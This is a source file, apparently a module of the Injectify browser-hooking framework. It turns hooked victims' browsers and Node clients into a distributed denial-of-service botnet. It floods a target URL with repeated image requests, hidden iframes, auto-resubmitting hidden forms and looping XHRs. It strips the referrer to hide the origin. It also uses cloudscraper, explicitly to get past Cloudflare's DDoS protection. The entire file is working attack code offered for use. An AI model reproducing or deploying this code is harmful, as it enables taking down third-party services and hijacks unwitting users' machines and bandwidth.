import ModuleTypings from '../../../definitions/module'
declare const { Module, injectify } : ModuleTypings

let request = {
  method: 'GET',
  url: Module.params,
  body: '',
  type: 'application/x-www-form-urlencoded',
  interval: 100,
  random: true,
}

/**
 * Functions
 */
let serialize = (obj) => {
  let str = []
  for (let p in obj)
    if (obj.hasOwnProperty(p)) {
      str.push(`${encodeURIComponent(p)}=${encodeURIComponent(obj[p])}`);
    }
  return str.join("&")
}

/**
 * Parse the parameters
 */
if (typeof Module.params == 'object') {
  let { method, type, url, interval, random, params, body } = Module.params

  if (method) request.method = method.toUpperCase()
  if (type) request.type = type
  if (url) request.url = url
  if (interval) request.interval = interval
  if (random) request.random = random
  if (params || body) {
    if (!body) body = params
    /**
     * Convert object parameters into query string
     */
    if (request.type === 'application/x-www-form-urlencoded') {
      if (typeof body === 'string') {
        /**
         * Remove proceeding ?
         */
        if (body.slice(0, 1) === '?') body = body.slice(1)
      } else if (typeof body === 'object') {
        body = serialize(body)
      }
    }
    /**
     * Stringify JSON
     */
    if (request.type === 'application/json') {
      body = JSON.stringify(body)
    }
    request.body = body
  }
}


if (injectify.info.platform === 'browser') {
  /**
   * Prevent referrer from being sent in the requests
   */
  let meta = document.createElement('meta')
  meta.name = 'referrer'
  meta.content = 'no-referrer'
  document.head.appendChild(meta)

  if (request.url) {
    if (request.method === 'GET') {
      /**
       * Parse the target url
       */
      let target = request.url
      if (request.body || request.random) {
        if (target.includes('?')) {
          /**
           * Target url already contains parameters
           */
          if (target.slice(-1) !== '&') target += '&'
        } else {
          /**
           * Target url doesn't contain parameters
           */
          target += '?'
        }
        /**
         * Parse the parameters
         */
        if (request.body) {
          target += request.body
          if (request.random) target += '&'
        }
      }

      /**
       * DDoS from multiple documents
       */

      injectify.module('embed', {
        interaction: false,
        hidden: true
      }).then(element => {
        element.srcdoc = `<script>setInterval(function(){ let url=${JSON.stringify(target)}${request.random}` ? '+"?"++new Date()' : `; let req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },${request.interval * 4})</script>`
      })

      /**
       * Request the target url
       */
      setInterval(() => {
        let url = target
        /**
         * Add a query string to prevent the server from sending a cached response
         */
        if (request.random) url += +new Date
        /**
         * Make a request
         */
        // if (typeof window.fetch === 'function') {
        //     window.fetch(url)
        // }
        let req = new Image()
        req.src = url
        req.onload
      }, request.interval)
      Module.return(true)
    } else {
      if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
        /**
         * POST request through a hidden form element
         */
        let form = document.createElement('form')
        let frameName = +new Date()
        form.setAttribute('action', request.url)
        form.setAttribute('method', request.method)
        form.setAttribute('target', frameName.toString())

        /**
         * Create the form elements
         */
        let params = request.body.split('&')
        for (let i in params) {
          /**
           * Parse the parameters
           */
          let param = params[i].split('=')
          let value = decodeURIComponent(param[1])
          /**
           * Create input element
           */
          let input = document.createElement('input')
          input.setAttribute('name', decodeURIComponent(param[0]))
          input.setAttribute('value', value)
          /**
           * Append to the form
           */
          form.appendChild(input)
        }
        /**
         * Make request
         */
        injectify.module('embed', {
          hidden: true
        }).then(embed => {
          embed.setAttribute('srcdoc', `<body onload="document.getElementsByTagName('form')[0].submit()">${form.outerHTML}<iframe name="${frameName}" onload="if(this.src!=='about:blank'){this.src='about:blank'}else{setTimeout(function(){document.getElementsByTagName('form')[0].submit()},${request.interval})}"/></body>`)
        })
      } else {
        /**
         * Custom request
         */
        (function ddosAttack() {
          let XHR = new XMLHttpRequest()

          XHR.open(request.method, request.url, true)
          XHR.setRequestHeader("Content-type", request.type)

          XHR.onreadystatechange = () => {
            setTimeout(ddosAttack, request.interval)
          }
          XHR.send(request.body)
        })()
        Module.return(true)
      }
    }
  } else {
    Module.return(false)
  }
} else {
  /**
   * NodeJS enabled client
   * Use cloudscraper to circumvent cloudflare DDoS prevention
   */
  let cloudscraper = eval(`require('cloudscraper')`);
  (function ddosAttack(thread) {
    let requestUrl = request.url
    if (request.random) requestUrl += `?${+new Date}`
    cloudscraper.get(requestUrl, (error, response, body) => {
      /**
       * Move out of callstack
       */
      if (thread == 1) {
        setTimeout(() => {
          ddosAttack(1)
        }, 0)
      }
    })
    if (thread == 1) {
      cloudscraper.get(requestUrl, () => {
        ddosAttack(2)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(3)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(4)
      })
      cloudscraper.get(requestUrl, () => {
        ddosAttack(5)
      })
    }
  })(1)
}